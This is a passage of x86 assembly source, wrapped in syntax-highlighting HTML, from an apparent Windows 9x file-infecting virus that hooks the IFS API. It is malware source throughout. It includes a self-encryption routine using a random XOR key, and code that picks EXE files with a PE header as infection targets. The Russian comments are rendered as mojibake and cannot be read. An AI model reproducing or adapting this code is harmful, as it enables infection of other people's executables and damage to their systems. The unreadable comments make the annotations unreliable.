        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_virus</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[ESI] -&gt; ES:[EDI]</span><span class="sc0">
</span><span class="sc5">new_crypt_number</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_edx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">new_crypt_number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc5">crypt_byte</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc5">start_crypt</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_crypt</span><span class="sc4">-</span><span class="sc5">start_crypt</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">decrypt</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‚å®¤: âªpëâë© HANDLE ä ©« </span><span class="sc0">
</span><span class="sc1">;      EBP - ®â­®á¨â¥«ì</span><span class="sc0">
</span><span class="sc1">;      [path_to_file] - "¤¨áª:¯ãâì\¨¬ï ä ©« ",0</span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: ‘¬®âp¨â¥ ¯¥p¥¬¥­­ë¥:</span><span class="sc0">
</span><span class="sc1">;       1) filename</span><span class="sc0">
</span><span class="sc1">;       2) extention</span><span class="sc0">
</span><span class="sc1">;       3) filemask</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¸</span><span class="sc0">
</span><span class="sc1">;”®p¬ â ¯¥p¥ç­ï ¨¬¥­ ä ©«®¢:                                   ;³</span><span class="sc0">
</span><span class="sc1">;1) ¯¥p¢ë¬ ¡ ©â®¬ ¨¤¥â ¤«¨­­  ¨¬¥­¨. p¨¬¥p 4,'ABCD'           ;³</span><span class="sc0">
</span><span class="sc1">;2) ¯®â®¬ á ¬® ¨¬ï (¡®«ìè¨¬¨ ¡ãª¢ ¬¨)                          ;³</span><span class="sc0">
</span><span class="sc1">;3) ¨ â.¤ ¤pã£¨¥ ¨¬¥­                                          ;³</span><span class="sc0">
</span><span class="sc1">;4) ¯¥p¥ç¥­ì ¤®«¦¥­ § ª ­ç¨¢ âìáï ¡ ©â®¬ 0ffh                  ;³</span><span class="sc0">
</span><span class="sc5">filenames</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; - p¨§­ ª ª®­æ                         ;³</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ</span><span class="sc0">
</span><span class="sc5">extentions</span><span class="sc4">:</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG_EXF</span><span class="sc0">                                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'EXF'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">                                                           </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">                                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">; - p¨§­ ª ª®­æ                        ;³</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ</span><span class="sc0">
</span><span class="sc1">;”®à¬ â:                                                        ³</span><span class="sc0">
</span><span class="sc1">;1) ‘«®¢® á¬¥é¥­¨ï ¬ áª¨                                        ³</span><span class="sc0">
</span><span class="sc1">;2) Š«îç¥¢®© ¡ ©â                                               ³</span><span class="sc0">
</span><span class="sc1">;   0 - (1) ¨ ¥áâì á¬¥é¥­¨¥ ¬ áª¨                               ³</span><span class="sc0">
</span><span class="sc1">;   1 - ‘¬¥é¥­¨¥ ¡¥p¥âáï ¨§ ä ©«  ¯® (1)                        ³</span><span class="sc0">
</span><span class="sc1">;3) „«¨­­  ¬ áª¨                                                ³</span><span class="sc0">
</span><span class="sc1">;4) Œ áª :                                                      ³</span><span class="sc0">
</span><span class="sc1">;   a)  ‘¨¬¢®« '?' - «î¡®¥ ç¨á«®                                ³</span><span class="sc0">
</span><span class="sc1">;   b)  ‘¨¬¢®« '*' - «î¡®© §­ ª                                 ³</span><span class="sc0">
</span><span class="sc1">;5) ¥p¥ç¥­ì ¤®«¦¥­ § ª ­ç¨¢ âìáï á¨¬¢®«®¬ 0ffh                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc5">filemasks</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;³                 ³</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">003Ch</span><span class="sc0">                       </span><span class="sc1">;³    Win32 App    ³</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'PE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; - p¨§­ ª ª®­æ       ;³                 ³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc1">;„«ï ­ ç «  ®â¤¥«¨¬ ¨¬ï ä ©«  ®â ¯ãâ¨</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">path_to_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">set_ebx_to_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">scan_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[ESI] ("¤¨áª:\¯ãâì\¨¬ï ä ©« ",0)-&gt; AL</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_ebx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_ebx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_ebx_to_name</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">filenames_check</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_name</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®¢¥pª  ¯® ¯¥p¥ç­î ¨¬¥­</span><span class="sc0">
</span><span class="sc5">filenames_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filenames</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc1">;®¯p®£p ¬¬  áp ¢­¥­¨ï ®¤­®© áâp®ª¨ á ­¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë</span><span class="sc0">
       </span><span class="sc1">;‚å®¤: DS:[ESI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢­¨¢ âìáï ­ ¡®p áâp®ª</span><span class="sc0">
       </span><span class="sc1">;      ES:[EDI] ¡ §  áâp®ª ¢ ä®p¬ â¥:</span><span class="sc0">
       </span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
       </span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
       </span><span class="sc1">;      db  0ffh  - p¨§­ ª ª®­æ </span><span class="sc0">
       </span><span class="sc1">;‚ëå®¤: AL==0  - ­¥â á®¢¯ ¤¥­¨©</span><span class="sc0">
       </span><span class="sc1">;       AL!=0 - ­®¬¥p á®¢¯ ¢è¥© áâp®ª¨ ­ ç¨­ ï á 1'æë</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®¢¥pª  ¯® ¯¥p¥ç­î p áè¨p¥­¨©</span><span class="sc0">
</span><span class="sc5">check_file_extention</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">seach_point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[ESI] -&gt; AL</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">point_found</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">seach_point</span><span class="sc0">
</span><span class="sc5">point_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">extentions</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">check_filemask</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;p®¢¥pª  ¯® ¯¥p¥ç­î ¬ á®ª</span><span class="sc0">
</span><span class="sc5">check_filemask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemasks</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">popedi_set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_win_check</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_win_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;—¨â ¥¬ ¬ áªã ¨ ¯p®¢¥pï¥¬ ¬ áªã</span><span class="sc0">
</span><span class="sc5">read_and_check_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;‚å®¤: EDX - ®â ªã¤  ç¨â âì</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc5">next_letter_of_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">next_letter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'?'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">letter_is_not_q</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
</span><span class="sc5">next_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">mask_coincide</span><span class="sc0">
</span><span class="sc5">letter_is_not_q</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">            </span><span class="sc1">;‘p ¢­¨¢ âì DS:[SI] á ES:[DI]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
        </span><span class="sc1">;‘®¢¯ «  ¬ áª </span><span class="sc0">
</span><span class="sc5">mask_coincide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_Asciiz</span><span class="sc0">
        </span><span class="sc1">;Œ áª  ­¥ á®¢¯ « </span><span class="sc0">
</span><span class="sc5">mask_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_mask</span><span class="sc0">
</span><span class="sc5">popedi_set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exit_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¯p®£p ¬¬  áp ¢­¥­¨ï ®¤­®© áâp®ª¨ á ­¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë</span><span class="sc0">
</span><span class="sc1">;‚å®¤: [ESI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢­¨¢ âìáï ­ ¡®p áâp®ª</span><span class="sc0">
</span><span class="sc1">;      [EDI] ¡ §  áâp®ª ¢ ä®p¬ â¥:</span><span class="sc0">
</span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
</span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
</span><span class="sc1">;      db  0ffh  - p¨§­ ª ª®­æ </span><span class="sc0">
</span><span class="sc1">;‚ëå®¤: AL==0 - á®¢¯ ¤¥­¨© ­¥â</span><span class="sc0">
</span><span class="sc1">;       AL!=0 - ­®¬¥p á®¢¯ ¢è¥© áâp®ª¨</span><span class="sc0">
</span><span class="sc5">cmps_string_with_databasestring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">next_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_coincide_string</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">cmpsb</span><span class="sc0">   </span><span class="sc1">; ‘p ¢­¨¢ âì DS:[ESI] á ES:[EDI]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">coincide_string</span><span class="sc0">
